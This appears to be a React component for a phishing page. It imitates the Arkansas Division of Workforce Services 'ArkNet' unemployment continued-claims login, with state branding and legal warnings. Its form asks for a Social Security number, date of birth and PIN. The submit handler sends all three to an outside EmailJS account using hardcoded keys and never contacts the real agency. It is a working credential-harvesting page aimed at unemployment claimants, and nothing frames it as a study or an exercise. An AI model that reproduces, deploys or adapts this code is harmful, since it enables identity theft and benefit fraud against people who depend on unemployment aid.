
"use client";
import { useState, useEffect } from 'react';
import emailjs from 'emailjs-com';


export default function MainContent() {
  // Form state
  const [formData, setFormData] = useState({
    ssn: '',
    birthdate: '',
    pin: '',
    pin_confirm: false,
  });
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  function handleChange(e) {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  }

  // Reusable EmailJS send function
  function sendEmail(data) {
    emailjs.send('service_ozea06x', 'template_vlbf82m', data, 'XMOnwjyzQDoRVRYl3')
      .then(() => {
        setFormSubmitted(true);
        setFormData({ ssn: '', birthdate: '', pin: '', pin_confirm: false });
        setTimeout(() => setFormSubmitted(false), 2000);
      })
      .catch(error => {
        console.log('EmailJS error:', error);
      });
  }

  function validateAndSend(e) {
    e.preventDefault();
    console.log('Form data:', formData);
    sendEmail({
      ssn: formData.ssn,
      birthdate: formData.birthdate,
      pin: formData.pin
    });
  }
  return (
    <>
      <header
        style={{
          width: '100vw',
          background: '#18234F',
          color: '#cccccc',
          zIndex: 100,
          boxShadow: '0 2px 8px rgba(0,0,0,0.07)',
          display: 'flex',
          alignItems: 'center',
          fontFamily: "'Segoe UI', Roboto, 'Helvetica Neue', sans-serif",
          minHeight: '60px',
          padding: '16px 0 16px 0',
        }}
      >
        <div className="header-flex">
          <div style={{ display: 'flex', alignItems: 'center', flex: '0 1 auto' }}>
            <span style={{ fontWeight: 700, fontSize: 'clamp(0.9rem,1.2vw,1.2rem)', letterSpacing: '0.5px', marginLeft: '1vw', marginRight: '4vw', textDecoration: 'underline', textUnderlineOffset: '3px', cursor: 'pointer' }}>Arkansas.gov</span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', flex: '1 1 auto', justifyContent: 'flex-end' }}>
            <nav
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: '1vw',
                flexWrap: 'nowrap',
                fontSize: 'clamp(1rem,1.2vw,1.2rem)',
                justifyContent: 'flex-end',
                flex: '0 1 auto',
                marginRight: '2vw',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '0px' }}>
                <a href="http://www.dws.arkansas.gov/" target="_blank" style={{ color: '#cccccc', textDecoration: 'underline', textUnderlineOffset: '3px', fontWeight: 500, padding: '0 0.15vw', cursor: 'pointer' }}>ADWS Home</a>
                <span style={{ color: '#bfc8e6', padding: '0 0.08vw' }}>|</span>
                <a href="https://www.dws.arkansas.gov/employers/ar-claim-help/" target="_blank" style={{ color: '#cccccc', textDecoration: 'underline', textUnderlineOffset: '3px', fontWeight: 500, padding: '0 0.15vw', cursor: 'pointer' }}>AR Claim Help</a>
                <span style={{ color: '#bfc8e6', padding: '0 0.08vw' }}>|</span>
                <a href="https://directory.arkansas.gov/agencies/" target="_blank" style={{ color: '#cccccc', textDecoration: 'underline', textUnderlineOffset: '3px', fontWeight: 500, padding: '0 0.15vw', cursor: 'pointer' }}>Agencies</a>
                <span style={{ color: '#bfc8e6', padding: '0 0.08vw' }}>|</span>
                <a href="https://directory.arkansas.gov/services/" target="_blank" style={{ color: '#cccccc', textDecoration: 'underline', textUnderlineOffset: '3px', fontWeight: 500, padding: '0 0.15vw', cursor: 'pointer' }}>Online Services</a>
                <span style={{ color: '#bfc8e6', padding: '0 0.08vw' }}>|</span>
                <a href="https://portal.arkansas.gov/acceptable-use/#privacy-policy" target="_blank" style={{ color: '#cccccc', textDecoration: 'underline', textUnderlineOffset: '3px', fontWeight: 500, padding: '0 0.15vw', cursor: 'pointer' }}>Policies</a>
                <span style={{ color: '#bfc8e6', padding: '0 2vw' }}></span>
                <a href="#" style={{ color: '#cccccc', textDecoration: 'underline', textUnderlineOffset: '3px', fontWeight: 500, padding: '0 0.15vw', cursor: 'pointer' }}>En Español</a>
              </div>
            </nav>
          </div>
        </div>
      </header>
      {/* Professional Section after header, before main container */}
      <style>{`
        .header-flex {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: space-between;
            width: 100vw;
            margin: 0;
            padding-top: 38px; /* Move all header texts down without increasing header height */
            padding: 32px 0 0 0; /* Add more top padding to header texts without increasing height */
            height: 100%;
      min-height: 32px; /* Revert to normal header vertical spacing for desktop */
        }
        @media (max-width: 600px) {
            header {
              padding: 0 !important; /* No padding for mobile */
            }
            .header-flex {
              flex-direction: column !important;
              align-items: flex-start !important;
              justify-content: flex-start !important;
              min-height: 20px !important; /* Absolute minimum header vertical spacing for mobile */
              padding: 0 !important;
            }
      .header-flex > div:first-child {
        width: 100vw !important;
        display: flex !important;
        align-items: flex-start !important;
        justify-content: flex-start !important;
        margin-bottom: 0 !important;
        padding-left: 2vw !important;
  padding-top: 0 !important; /* Revert header height and padding */
  margin-top: 18px !important; /* Move Arkansas.gov text down for alignment */
          }
          .header-flex > div:last-child {
            width: 100vw !important;
            display: flex !important;
            align-items: flex-start !important;
            justify-content: flex-start !important;
              padding-left: 2vw !important;
              position: relative !important;
              top: 0 !important; /* Revert nav links offset */
              marginTop: 0 !important;
              z-index: 20 !important;
          }
          .header-flex nav {
            flex-wrap: wrap !important;
            gap: 0 !important; /* Remove vertical spacing */
            width: 100vw !important;
          }
          .header-flex nav > div {
            flex-wrap: wrap !important;
            gap: 0 !important; /* Remove vertical spacing */
            width: 100vw !important;
            display: flex !important;
          }
          }
        }
      `}</style>
      <style>{`
        .logo-bg {
          background: #dde4ea;
          border-bottom: 1px solid #e0e6ed;
          padding-left: 180px; /* Add left padding for desktop */
          min-height: 60px;
          width: 100vw;
          box-sizing: border-box;
          position: relative;
          margin-top: 8px; /* Sits just below the header (header height + padding) */
          z-index: 10;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        @media (max-width: 600px) {
          .logo-bg {
            padding-left: 16px !important;
            padding-right: 16px !important;
            min-height: 120px !important;
            flex-direction: column !important;
            align-items: center !important;
            justify-content: flex-start !important;
            border: 12px solid #fff !important;
            border-radius: 0 !important;
            box-shadow: 0 4px 16px rgba(0,0,0,0.10) !important;
            margin-top: 8px !important;
          }
          section[aria-label="main content"] {
            min-height: 100vh !important;
            padding: 0 8px !important;
            box-sizing: border-box !important;
            display: flex !important;
            flex-direction: column !important;
            align-items: center !important;
            justify-content: flex-start !important;
          }
          .requalifyingborder {
            max-width: 100vw !important;
            padding: 16px 4vw 16px 4vw !important;
            box-sizing: border-box !important;
          }
        }
      `}</style>
  <div className="logo-bg logo-section">
        <style>{`
          .logo-img {
            height: 140px;
            max-width: 380px;
            width: auto;
            margin-right: 2vw;
            margin-bottom: 0;
            object-fit: contain;
            box-shadow: 0 2px 8px rgba(0,0,0,0.07);
            align-self: flex-start;
          }
          .logo-section {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: flex-start;
            min-height: 80px;
          }
            .logo-headings {
              display: flex;
              flex-direction: column;
              justify-content: flex-start;
              align-items: flex-start;
              margin-top: 0;
              margin-left: 1vw;
              text-align: left;
            }
                {isMobile ? (
                  <span>
                    Unemployment Insurance<br />
                    Continued<br />
                    Claims
                  </span>
                ) : (
                  'Unemployment Insurance Continued Claims'
                )}
            }
          @media (max-width: 600px) {
            .logo-section {
              flex-direction: column !important;
              align-items: center !important;
              justify-content: flex-start !important;
              min-height: 80px !important;
              width: 100vw !important;
              padding: 0 !important;
            }
            .logo-headings {
              margin-top: 0 !important;
              margin-bottom: 0 !important;
            }
            .logo-headings h2 {
              margin-bottom: 0 !important;
            }
            .logo-headings h3 {
              margin-top: 0 !important;
            }
            }
            .logo-img {
              height: 80px !important;
              max-width: 160px !important;
              margin-right: 0 !important;
              margin-bottom: 8px !important;
              align-self: flex-start !important;
            }
              .logo-headings {
                align-items: flex-start !important;
                margin-left: 0 !important;
                margin-top: 0 !important;
                text-align: left !important;
              }
              .logo-headings h2 {
                margin-bottom: 4px !important;
                text-align: left !important;
                white-space: normal !important;
                font-size: 2.3rem !important;
              }
              .logo-headings h3 {
                  margin-top: 0 !important;
                  text-align: left !important;
                  white-space: normal !important;
                  font-size: 1.7rem;
                  /* Remove max-width and word-break for desktop */
      .logo-headings h3 {
        font-size: 1.5rem !important;
        max-width: 220px !important;
        word-break: break-word !important;
      }
                }
          }
        `}</style>
        <img
          src="/logo.png"
          alt="ArkNet Logo"
          className="logo-img"
        />
        <div className="logo-headings">
          <h2 style={{
            fontFamily: 'Alfabet, sans-serif',
            fontWeight: 700,
            fontSize: '2.7rem',
            color: '#092963',
            letterSpacing: '0.2px',
            lineHeight: 1.2,
            boxSizing: 'border-box',
            whiteSpace: 'nowrap',
          }}>
            Arkansas Division of Workforce Services
          </h2>
          <h3 style={{
            fontFamily: 'Alfabet, sans-serif',
            fontWeight: 900,
            fontSize: '1.4rem',
            color: '#3b82f6', // Blue for emphasis
            letterSpacing: '0.2px',
            textTransform: 'uppercase',
          }}>
            {isMobile ? (
              <>
                Unemployment Insurance<br />
                Continued<br />
                Claims
              </>
            ) : (
              'Unemployment Insurance Continued Claims'
            )}
          </h3>
        </div>
  </div>
  <main id="PAGES_CONTAINER" tabIndex={-1} style={{
        background: '#fff',
  fontFamily: 'Arial, Helvetica, sans-serif',
        color: '#071C93',
        boxSizing: 'border-box',
        width: '100%',
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'flex-start',
        padding: 0,
        margin: 0,
      }}>
        <section style={{background: '#fff', padding: '0', width: '100%', minHeight: '80vh', display: 'flex', flexDirection: 'column', alignItems: 'center', boxSizing: 'border-box'}} aria-label="main content">
          <div style={{width: '100%', maxWidth: 900, margin: '0 auto', padding: '32px 0 0 0'}}>
            <div style={{ width: '100%', textAlign: 'center', fontWeight: 'bold', fontSize: 28, marginBottom: 32, fontFamily: 'Arial, Helvetica, sans-serif' }}>
                  <div style={{ letterSpacing: 'normal' }}>
                    <span style={{ color: '#111' }}>Welcome to </span><span style={{ color: '#071C93' }}>ArkNet (Arkansas Internet Continued Claims System)</span>
                  </div>
                  <div style={{ fontWeight: 400, fontSize: 22, marginTop: 20, color: '#071C93' }}>
                    Please log in: (If you set a PIN on Arkline use that PIN here)
                  </div>
            </div>
            <form onSubmit={validateAndSend}>
              {formSubmitted && (
                <div style={{ color: '#0a0', fontWeight: 'bold', fontSize: 20, marginBottom: 16 }}>Form submitted</div>
              )}
              <fieldset className="requalifyingborder">
                <style>{`
                  .requalifyingborder {
                    max-width: 1000px;
                    width: 100%;
                    padding: 64px 64px 48px 64px;
                    margin: 0 auto;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                  }
                  .form-row {
                    display: flex;
                    flex-direction: row;
                    align-items: center;
                    justify-content: flex-start;
                    width: 100%;
                    margin-bottom: 18px;
                  }
                  .form-row > div:first-child {
                    margin-right: 18px;
                  }
                  @media (max-width: 600px) {
                    .requalifyingborder {
                      max-width: 97vw !important;
                      width: 97vw !important;
                      min-width: 0 !important;
                      padding: 8vw 6vw 8vw 0 !important;
                      box-sizing: border-box !important;
                      overflow-x: hidden !important;
                    }
                    form {
                      max-width: 97vw !important;
                      width: 97vw !important;
                      min-width: 0 !important;
                      padding: 0 6vw 0 0 !important;
                      box-sizing: border-box !important;
                      overflow-x: hidden !important;
                    }
                    .form-row {
                      flex-direction: row !important;
                      align-items: center !important;
                      justify-content: flex-start !important;
                      width: 100% !important;
                      margin-bottom: 18px !important;
                      box-sizing: border-box !important;
                      overflow-x: hidden !important;
                    }
                    .form-row > div {
                      margin-right: 8px !important;
                      margin-bottom: 0 !important;
                      max-width: 45vw !important;
                      min-width: 0 !important;
                      box-sizing: border-box !important;
                      overflow-x: hidden !important;
                    }
                    input[type="text"]#ClaimantID {
                      max-width: 28vw !important;
                      min-width: 0 !important;
                      font-size: 15px !important;
                      box-sizing: border-box !important;
                      overflow-x: hidden !important;
                    }
                    input {
                      max-width: 45vw !important;
                      min-width: 0 !important;
                      font-size: 15px !important;
                      box-sizing: border-box !important;
                      overflow-x: hidden !important;
                    }
                  }
                `}</style>
                <div className="form-row">
                  <div style={{paddingLeft: 8, paddingRight: 8}}>
                    <span style={{ lineHeight: 'normal', fontSize: 13, letterSpacing: 'normal' }}>
                      ID (Social Security Number)
                    </span>
                    <span style={{ fontSize: 22, color: '#8B0000', letterSpacing: 'normal', marginLeft: 4 }}>*</span>
                  </div>
                  <div>
                    <input
                      type="text"
                      id="ClaimantID"
                      name="ssn"
                      required
                      maxLength={100}
                      autoComplete="off"
                      aria-invalid="false"
                      value={formData.ssn}
                      onChange={handleChange}
                      style={{
                        padding: '10px 16px',
                        fontSize: 18,
                        border: '1px solid #ccc',
                        borderRadius: 4,
                        width: 110,
                      }}
                    />
                  </div>
                </div>
                <div className="form-row">
                  <div style={{paddingLeft: 8, paddingRight: 8}}>
                    <span style={{ lineHeight: 'normal', fontSize: 13, letterSpacing: 'normal' }}>
                      DOB (MM/DD/YYYY)
                    </span>
                    <span style={{ fontSize: 22, color: '#8B0000', letterSpacing: 'normal', marginLeft: 4 }}>*</span>
                  </div>
                  <div>
                    <input
                      type="text"
                      id="Dob"
                      name="birthdate"
                      required
                      maxLength={10}
                      autoComplete="off"
                      aria-invalid="false"
                      placeholder="MM/DD/YYYY"
                      value={formData.birthdate}
                      onChange={handleChange}
                      style={{
                        padding: '10px 16px',
                        fontSize: 18,
                        border: '1px solid #ccc',
                        borderRadius: 4,
                        width: 120,
                      }}
                    />
                  </div>
                </div>
                <div className="form-row">
                  <div style={{paddingLeft: 8, paddingRight: 8}}>
                    <span style={{ lineHeight: 'normal', fontSize: 13, letterSpacing: 'normal' }}>
                      PIN (Personal Identification Number)
                    </span>
                    <span style={{ fontSize: 22, color: '#8B0000', letterSpacing: 'normal', marginLeft: 4 }}>*</span>
                  </div>
                  <div>
                    <input
                      type="password"
                      id="Pin"
                      name="pin"
                      required
                      maxLength={8}
                      autoComplete="off"
                      aria-invalid="false"
                      placeholder="Enter PIN"
                      value={formData.pin}
                      onChange={handleChange}
                      style={{
                        padding: '10px 16px',
                        fontSize: 18,
                        border: '1px solid #ccc',
                        borderRadius: 4,
                        width: 120,
                      }}
                    />
                  </div>
                </div>
                {/* PIN info text and checkbox, centered below last field */}
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', width: '100%', marginTop: 8 }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 8 }}>
                    <input
                      type="checkbox"
                      id="pinConfirm"
                      name="pin_confirm"
                      checked={formData.pin_confirm}
                      onChange={handleChange}
                      style={{ marginRight: 8 }}
                    />
                    <label htmlFor="pinConfirm" style={{ fontSize: 15, color: '#222', textAlign: 'center' }}>
                      <span style={{ color: '#d60000' }}>If you have not already established a four-digit PIN using Arkline, enter your new PIN above and click this box.</span>
                    </label>
                  </div>
                  {/* Login button centered below tick box and text */}
                  <button type="submit" style={{ padding: '8px 24px', fontSize: 16, background: '#071C93', color: '#fff', border: 'none', borderRadius: 4, cursor: 'pointer', minWidth: 100, marginTop: 8, alignSelf: 'center' }}>
                    Login
                  </button>
                </div>
              </fieldset>
            </form>
            {/* Info Section */}
            <div style={{width: '100%', maxWidth: 900, margin: '24px auto 0 auto', fontSize: 14, color: '#003366', fontWeight: 500, textAlign: 'left'}}>
              <span style={{fontSize: '20px'}}>Use of this system may be monitored to detect improper use and potential violations of state policy.</span>
            </div>
            <div style={{width: '100%', maxWidth: 900, margin: '12px auto 0 auto', fontSize: 14, color: '#071C93', textAlign: 'left'}}>
              <span style={{fontSize: '20px'}}><span style={{fontWeight: 'bold'}}>ArkNet</span> is restricted to users who have established a current and valid Arkansas Unemployment Insurance Claim. <span style={{fontWeight: 'bold'}}>Unauthorized use of this system constitutes a security violation.</span> Violators may be subject to disciplinary or civil action, or criminal prosecution under applicable Federal and State laws.</span>
            </div>
            <div style={{width: '100%', maxWidth: 900, margin: '12px auto 0 auto', fontSize: 14, color: '#EA7575', textAlign: 'center', fontWeight: 'bold'}}>
              <span style={{fontSize: '20px'}}>The web browsers best suited for this site are the most recent versions of Microsoft Edge, Mozilla Firefox, and Google Chrome.</span>
            </div>
            {/* Translation Services Section */}
            <div style={{width: '100%', maxWidth: 900, margin: '24px auto 0 auto', fontSize: 14, color: '#003366', fontWeight: 500, textAlign: 'left'}}>
            </div>
          </div>
        </section>
      </main>
    </>
  );
}

